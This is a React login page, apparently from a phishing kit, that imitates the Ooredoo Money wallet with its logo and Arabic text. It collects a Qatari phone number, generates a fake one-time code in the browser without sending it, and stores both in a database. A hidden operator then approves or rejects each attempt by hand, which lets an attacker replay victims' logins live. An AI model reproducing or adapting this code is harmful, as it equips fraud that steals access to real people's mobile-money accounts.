import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";
import ooredooLogo from "@/assets/ooredoo-logo.webp";
import { Smartphone, Shield, Zap, Globe, Loader2 } from "lucide-react";

const Login = () => {
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [requestId, setRequestId] = useState<string | null>(null);
  const navigate = useNavigate();
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const handleSendOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phone || phone.length < 8) {
      toast.error("يرجى إدخال رقم هاتف صحيح");
      return;
    }

    setLoading(true);
    const formattedPhone = phone.startsWith("+") ? phone : `+974${phone}`;
    const otpCode = Math.floor(100000 + Math.random() * 900000).toString();

    const { data, error } = await supabase
      .from("login_requests")
      .insert({ phone: formattedPhone, otp_code: otpCode })
      .select("id")
      .single();

    if (error || !data) {
      toast.error("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
      return;
    }

    setRequestId(data.id);
    setWaiting(true);
    toast.info("تم إرسال طلبك، بانتظار موافقة المسؤول...");
  };

  // Listen for admin approval/rejection via Realtime
  useEffect(() => {
    if (!waiting || !requestId) return;

    const channel = supabase
      .channel("login_approval_" + requestId)
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "login_requests",
        filter: `id=eq.${requestId}`,
      }, (payload) => {
        const row = payload.new as { status: string };
        if (row.status === "approved") {
          toast.success("تمت الموافقة! جاري تسجيل الدخول...");
          navigate("/dashboard");
        } else if (row.status === "rejected") {
          toast.error("المعلومات المدخلة غير صحيحة");
          setWaiting(false);
          setLoading(false);
          setRequestId(null);
        }
      })
      .subscribe();

    channelRef.current = channel;
    return () => { supabase.removeChannel(channel); };
  }, [waiting, requestId, navigate]);

  return (
    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
      {/* Top gradient section */}
      <div className="relative bg-primary pt-12 pb-24 px-4 rounded-b-[3rem] overflow-hidden">
        {/* Decorative circles */}
        <div className="absolute top-[-60px] right-[-40px] w-48 h-48 rounded-full bg-primary-foreground/5" />
        <div className="absolute bottom-[-30px] left-[-20px] w-32 h-32 rounded-full bg-primary-foreground/5" />
        <div className="absolute top-10 left-10 w-20 h-20 rounded-full bg-primary-foreground/5" />

        <div className="relative z-10 flex flex-col items-center space-y-4">
          <div className="w-20 h-20 rounded-2xl bg-primary-foreground/10 backdrop-blur-sm flex items-center justify-center border border-primary-foreground/10 shadow-lg">
            <img src={ooredooLogo} alt="Ooredoo Money" className="w-14 h-14 rounded-xl" />
          </div>
          <div className="text-center space-y-1">
            <h1 className="text-2xl font-extrabold text-primary-foreground">Ooredoo Money</h1>
            <p className="text-primary-foreground/70 text-sm">
              محفظتك الرقمية لإدارة أموالك بسهولة
            </p>
          </div>
        </div>
      </div>

      {/* Login form card */}
      <div className="flex-1 px-4 -mt-12">
        <div className="w-full max-w-sm mx-auto">
          <div className="glass-card rounded-2xl p-6 shadow-xl space-y-6">
            <div className="text-center space-y-1">
              <h2 className="text-lg font-bold text-foreground">تسجيل الدخول</h2>
              <p className="text-sm text-muted-foreground">أدخل رقم هاتفك للمتابعة</p>
            </div>

            <form onSubmit={handleSendOtp} className="space-y-5">
              <div className="space-y-2">
                <label className="text-sm font-semibold text-foreground">رقم الهاتف</label>
                <div className="relative">
                  <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-2 text-muted-foreground">
                    <Smartphone className="h-4 w-4" />
                    <span className="text-sm font-semibold">974+</span>
                  </div>
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    <div className="w-2 h-2 rounded-full bg-success animate-pulse-soft" />
                  </div>
                  <Input
                    type="tel"
                    placeholder="XXXX XXXX"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
                    className="pr-24 pl-8 text-left h-13 text-lg tracking-wider bg-muted/50 border-border/50 focus:bg-card"
                    maxLength={8}
                    dir="ltr"
                  />
                </div>
              </div>

              <Button
                type="submit"
                className="w-full h-12 text-base font-bold rounded-xl shadow-md hover:shadow-lg transition-all"
                disabled={loading || phone.length < 8}
              >
                {loading ? (
                  <span className="animate-pulse-soft">جاري الإرسال...</span>
                ) : (
                  "إرسال رمز التحقق"
                )}
              </Button>
            </form>
          </div>

          {/* Features */}
          <div className="grid grid-cols-3 gap-3 mt-6">
            {[
              { icon: Shield, label: "آمن و موثوق" },
              { icon: Zap, label: "سريع و سهل" },
              { icon: Globe, label: "في كل مكان" },
            ].map((feature) => (
              <div key={feature.label} className="flex flex-col items-center gap-2 py-3">
                <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
                  <feature.icon className="h-5 w-5 text-primary" />
                </div>
                <span className="text-xs font-medium text-muted-foreground">{feature.label}</span>
              </div>
            ))}
          </div>

          <p className="text-center text-xs text-muted-foreground mt-6 pb-6">
            بتسجيل الدخول، أنت توافق على{" "}
            <span className="text-primary cursor-pointer font-medium hover:underline">الشروط والأحكام</span>
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
